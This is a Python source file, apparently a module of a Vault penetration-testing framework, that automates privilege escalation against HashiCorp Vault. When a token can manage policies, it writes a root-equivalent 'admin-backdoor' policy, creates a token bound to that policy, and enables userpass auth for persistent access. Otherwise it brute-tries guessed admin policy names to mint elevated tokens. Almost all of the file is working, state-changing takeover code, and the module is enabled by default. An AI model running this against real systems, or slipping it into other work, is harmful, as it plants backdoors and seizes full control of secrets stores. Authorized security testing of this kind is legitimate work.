"""Active privilege escalation — autonomous takeover via policy creation.

When a token has ``sudo`` on a wildcard path (``*``, ``sys/*``, or
``sys/policies/acl/*``) the module:

1. Immediately reports **FULL TAKEOVER POSSIBLE**.
2. Creates a new ``admin-backdoor`` policy with root-equivalent capabilities.
3. Generates a new token attached to that policy (root-level access).
4. Attempts to enable userpass auth for persistent access.

If wildcard access is not present, the module falls back to trying
candidate high-privilege policy names via ``auth/token/create``.
"""

from __future__ import annotations

from typing import Optional

from core.tls_config import vault_request
from core.logger import logger

from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10
CRITICAL_POLICIES = [
    "admin",
    "admin-policy",
    "vault-admin",
    "master",
    "root-policy",
    "production-admin",
    "devops-admin",
    "management",
]

# Policy body that grants full root-equivalent access
FULL_ACCESS_POLICY = """
path "*" {
    capabilities = ["create", "read", "update", "delete", "list", "sudo"]
}
""".strip()


class PrivilegeEscalationModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="privilege_escalation.token_abuse",
            title="Active Token Privilege Escalation & Autonomous Takeover",
            risk_level=RiskLevel.STATE_CHANGING,
            domain="token",
            description=(
                "Detects wildcard sudo paths, creates admin-backdoor policies, "
                "generates root-equivalent tokens, and deploys persistent auth "
                "methods. Falls back to candidate-policy token creation when "
                "wildcard policy management is unavailable."
            ),
            default_enabled=True,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(getattr(context, "vault_addr", None) and getattr(context, "token", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Privilege escalation requires both vault_addr and token.",
                evidence={"missing": _missing_context_fields(context)},
            )

        params = params or {}
        vault_addr = context.vault_addr.rstrip("/")
        headers = {
            "X-Vault-Token": context.token,
            "Content-Type": "application/json",
        }
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
        requested_ttl = params.get("ttl", "30m")
        user_policies = params.get("policies")

        # ── Phase 0: Check source token ────────────────────────────────
        source_policies = _lookup_source_policies(vault_addr, headers, timeout, verify_tls)

        # ── Phase 1: Wildcard policy management detection ──────────────
        can_manage_policies = _token_can_manage_policies(
            vault_addr, headers, timeout, verify_tls
        )

        if can_manage_policies:
            return self._autonomous_takeover(
                vault_addr, headers, timeout, verify_tls,
                requested_ttl, source_policies, context, namespace, params,
            )

        # ── Phase 2: Fallback — try candidate policies ─────────────────
        if user_policies:
            if isinstance(user_policies, str):
                target_policies = [user_policies]
            else:
                target_policies = _dedupe([str(p) for p in user_policies if p])
        else:
            target_policies = list(CRITICAL_POLICIES)

        return self._candidate_policy_escalation(
            vault_addr, headers, timeout, verify_tls,
            target_policies, requested_ttl, source_policies, context,
        )

    # ── autonomous takeover ────────────────────────────────────────────

    def _autonomous_takeover(
        self, vault_addr, headers, timeout, verify_tls,
        ttl, source_policies, context, namespace, params=None,
    ):
        """Full takeover: create admin-backdoor policy → create token → deploy persistence."""
        evidence: dict = {
            "takeover_phase": "autonomous",
            "source_token_policies": source_policies,
            "wildcard_policy_access": True,
        }
        takeover_steps: list[dict] = []

        # Step 1: Report wildcard detection
        context.add_finding(
            title="CRITICAL: FULL TAKEOVER POSSIBLE — Wildcard Policy Management Detected",
            description=(
                "The supplied token has sudo access to sys/policies/acl/*. "
                "An attacker can create a root-equivalent policy and generate "
                "a new token with full cluster access. This is a complete "
                "Vault compromise."
            ),
            severity="CRITICAL",
            evidence={"source_policies": source_policies},
        )

        # Step 2: Create admin-backdoor policy
        backdoor_policy = (params or {}).get("backdoor_policy_name", "admin-backdoor")
        policy_created = _create_or_update_policy(
            vault_addr, headers, backdoor_policy, FULL_ACCESS_POLICY,
            timeout, verify_tls,
        )
        takeover_steps.append({"step": "create_policy", "success": policy_created,
                               "policy_name": backdoor_policy})
        evidence["policy_created"] = policy_created
        evidence["backdoor_policy"] = backdoor_policy

        if policy_created:
            logger.info(f"[ACTIVE] Created root-equivalent policy: {backdoor_policy}")
            context.add_finding(
                title="CRITICAL: Root-Equivalent Policy Created",
                description=(
                    f"Created '{backdoor_policy}' policy granting create/read/update/"
                    "delete/list/sudo on path '*'. This is a complete Vault takeover."
                ),
                severity="CRITICAL",
                evidence={"policy_name": backdoor_policy, "policy_body": FULL_ACCESS_POLICY},
            )
        else:
            logger.error("[ACTIVE] Failed to create admin-backdoor policy")

        # Step 3: Create token with admin-backdoor policy
        token_created = False
        escalated_token = None
        if policy_created:
            token_created, escalated_token = _create_token_with_policy(
                vault_addr, headers, backdoor_policy, ttl,
                timeout, verify_tls,
            )
            takeover_steps.append({"step": "create_token", "success": token_created,
                                   "policy": backdoor_policy})
            evidence["token_created"] = token_created

            if token_created and escalated_token:
                evidence["escalated_token"] = escalated_token
                setattr(context, "captured_token", escalated_token)
                setattr(context, "escalated_token", escalated_token)
                logger.info(f"[ACTIVE] Root-equivalent token created: {escalated_token[:24]}...")
                context.add_finding(
                    title="CRITICAL: Root-Equivalent Token Created via Backdoor Policy",
                    description=(
                        f"Generated a new token with '{backdoor_policy}' policy "
                        "granting full cluster access. Complete Vault compromise achieved."
                    ),
                    severity="CRITICAL",
                    evidence={
                        "policy": backdoor_policy,
                        "token_preview": f"{escalated_token[:24]}...",
                    },
                )

        # Step 4: Try to enable userpass auth for persistence
        can_manage_auth = _token_can_manage_auth(vault_addr, headers, timeout, verify_tls)
        persistence_deployed = False
        if can_manage_auth:
            persistence_deployed = _enable_userpass_auth(
                vault_addr, headers, timeout, verify_tls,
            )
            takeover_steps.append({"step": "enable_userpass", "success": persistence_deployed})
            evidence["persistence_deployed"] = persistence_deployed

            if persistence_deployed:
                logger.info("[ACTIVE] Userpass auth method enabled for persistence")
                context.add_finding(
                    title="CRITICAL: Persistent Access Deployed via Userpass Auth",
                    description=(
                        "Enabled userpass authentication method. Attacker can now "
                        "authenticate with username/password for persistent Vault access."
                    ),
                    severity="CRITICAL",
                    evidence={"auth_method": "userpass", "auth_path": "userpass"},
                )

        evidence["takeover_steps"] = takeover_steps
        evidence["full_takeover_complete"] = token_created

        if token_created:
            return ExecutionResult(
                status="success",
                message=(
                    f"FULL TAKEOVER COMPLETE: Created '{backdoor_policy}' policy, "
                    f"generated root-equivalent token, persistence={'deployed' if persistence_deployed else 'skipped'}."
                ),
                evidence=evidence,
            )

        return ExecutionResult(
            status="failed",
            message="Partial takeover: could not create escalated token.",
            evidence=evidence,
        )

    # ── candidate-policy fallback ──────────────────────────────────────

    def _candidate_policy_escalation(
        self, vault_addr, headers, timeout, verify_tls,
        target_policies, ttl, source_policies, context,
    ):
        """Try creating tokens with existing high-privilege policy names."""
        create_url = f"{vault_addr}/v1/auth/token/create"
        attempts = []

        for policy_name in target_policies:
            if policy_name in source_policies:
                logger.info(f"[ACTIVE] Skipping already-held policy: {policy_name}")
                attempts.append({
                    "policy": policy_name,
                    "status_code": "skipped",
                    "reason": "policy already present on source token",
                })
                continue

            payload = {"policies": [policy_name], "ttl": ttl}
            logger.info(f"[ACTIVE] Attempting policy: {policy_name}")
            response = vault_request(
                "POST", create_url, headers=headers, json=payload,
                timeout=timeout, verify=verify_tls,
            )
            attempt = {"policy": policy_name, "status_code": response.status_code}
            attempts.append(attempt)

            if response.status_code != 200:
                attempt["response_text"] = response.text[:300]
                continue

            response_data = _safe_response_json(response)
            new_token = response_data.get("auth", {}).get("client_token")
            token_policies = response_data.get("auth", {}).get("policies", [])
            added = _added_policies(source_policies, token_policies)
            attempt["returned_policies"] = token_policies
            attempt["added_policies"] = added

            if policy_name not in added:
                attempt["reason"] = "created token did not add a new candidate policy"
                continue

            # Verify the new token actually has elevated privileges
            if new_token and not _token_has_elevated_access(
                vault_addr, new_token, timeout, verify_tls
            ):
                logger.warning(f"[ACTIVE] Token with '{policy_name}' created but NOT elevated — skipping")
                attempt["reason"] = "policy does not grant elevated access (non-existent or weak policy)"
                continue

            evidence = {
                "status_code": response.status_code,
                "url": create_url,
                "requested_policies": [policy_name],
                "ttl": ttl,
                "success": True,
                "source_token_policies": source_policies,
                "attempted_policies": attempts,
                "selected_policy": policy_name,
                "escalated_token_policies": token_policies,
                "added_policies": added,
            }
            if new_token:
                evidence["captured_token"] = new_token
                setattr(context, "captured_token", new_token)
                setattr(context, "escalated_token", new_token)

            context.add_finding(
                title="CRITICAL: Privilege Escalation Successful",
                description=(
                    f"Generated a new token with elevated privileges "
                    f"using policy '{policy_name}': {token_policies}"
                ),
                severity="CRITICAL",
                evidence=evidence,
            )
            return ExecutionResult(
                status="success",
                message=f"Privilege escalation succeeded. Selected policy: {policy_name}.",
                evidence=evidence,
            )

        evidence = {
            "status_code": attempts[-1]["status_code"] if attempts else None,
            "url": create_url,
            "requested_policies": target_policies,
            "ttl": ttl,
            "success": False,
            "source_token_policies": source_policies,
            "attempted_policies": attempts,
        }
        return ExecutionResult(
            status="failed",
            message="Privilege escalation failed for all candidate policies.",
            evidence=evidence,
        )


# -----------------------------------------------------------------------
# Helpers — policy management
# -----------------------------------------------------------------------


def _token_can_manage_policies(vault_addr, headers, timeout, verify_tls):
    """Check whether the token can create/update ACL policies."""
    url = f"{vault_addr}/v1/sys/policies/acl/admin-backdoor"
    # Use a dry-run approach: try reading a non-existent policy; if we get
    # a 403 (forbidden) we can't manage policies; any other response means
    # the token has access to the policies subsystem.
    try:
        resp = vault_request("GET", url, headers=headers, timeout=timeout, verify=verify_tls)
    except Exception:
        return False
    # 200=policy exists, 404=policy missing but access granted, 403=forbidden
    return resp.status_code in (200, 404)


def _token_can_manage_auth(vault_addr, headers, timeout, verify_tls):
    """Check whether the token can enable auth methods."""
    url = f"{vault_addr}/v1/sys/auth"
    try:
        resp = vault_request("GET", url, headers=headers, timeout=timeout, verify=verify_tls)
    except Exception:
        return False
    return resp.status_code == 200


def _create_or_update_policy(vault_addr, headers, policy_name, policy_body, timeout, verify_tls):
    """Create or update an ACL policy.  Returns True on success."""
    url = f"{vault_addr}/v1/sys/policies/acl/{policy_name}"
    try:
        resp = vault_request(
            "PUT", url, headers=headers,
            json={"policy": policy_body},
            timeout=timeout, verify=verify_tls,
        )
    except Exception:
        return False
    return resp.status_code in (200, 204)


def _create_token_with_policy(vault_addr, headers, policy_name, ttl, timeout, verify_tls):
    """Create a token with the given policy.  Returns (success, token_string)."""
    url = f"{vault_addr}/v1/auth/token/create"
    payload = {"policies": [policy_name], "ttl": ttl}
    try:
        resp = vault_request(
            "POST", url, headers=headers, json=payload,
            timeout=timeout, verify=verify_tls,
        )
    except Exception:
        return False, None

    if resp.status_code != 200:
        return False, None

    data = _safe_response_json(resp)
    token = data.get("auth", {}).get("client_token")
    return bool(token), token


def _enable_userpass_auth(vault_addr, headers, timeout, verify_tls):
    """Enable userpass auth method.  Returns True on success."""
    url = f"{vault_addr}/v1/sys/auth/userpass"
    payload = {"type": "userpass"}
    try:
        resp = vault_request(
            "POST", url, headers=headers, json=payload,
            timeout=timeout, verify=verify_tls,
        )
    except Exception:
        return False
    return resp.status_code in (200, 204)


# -----------------------------------------------------------------------
# Helpers — existing
# -----------------------------------------------------------------------


def _lookup_source_policies(vault_addr, headers, timeout, verify_tls):
    url = f"{vault_addr}/v1/auth/token/lookup-self"
    try:
        response = vault_request("GET", url, headers=headers, timeout=timeout, verify=verify_tls)
    except Exception:
        return []

    if response.status_code != 200:
        return []

    data = _safe_response_json(response)
    token_data = data.get("data", {})
    policies = token_data.get("policies") or []
    identity_policies = token_data.get("identity_policies") or []
    return sorted({str(p) for p in [*policies, *identity_policies] if p})


def _safe_response_json(response):
    try:
        data = response.json()
    except ValueError as error:
        raise ValueError(f"invalid json response: {response.text[:200]}") from error
    return data if isinstance(data, dict) else {}


def _added_policies(source_policies, token_policies):
    source = set(source_policies)
    return sorted(
        str(p) for p in token_policies
        if p and p != "default" and str(p) not in source
    )


def _token_has_elevated_access(vault_addr, token, timeout, verify_tls):
    """Verify a newly created token actually has elevated privileges.

    Checks whether the token can read sys/mounts — a reliable indicator
    that the escalated policy grants real access beyond the default policy.
    Tokens created with non-existent policy names will fail this check.
    """
    url = f"{vault_addr}/v1/sys/mounts"
    headers = {"X-Vault-Token": token}
    try:
        resp = vault_request("GET", url, headers=headers, timeout=timeout, verify=verify_tls)
        return resp.status_code == 200
    except Exception:
        return False


def _dedupe(items):
    deduped = []
    for item in items:
        if item not in deduped:
            deduped.append(item)
    return deduped


def _missing_context_fields(context):
    missing = []
    if not getattr(context, "vault_addr", None):
        missing.append("vault_addr")
    if not getattr(context, "token", None):
        missing.append("token")
    return missing
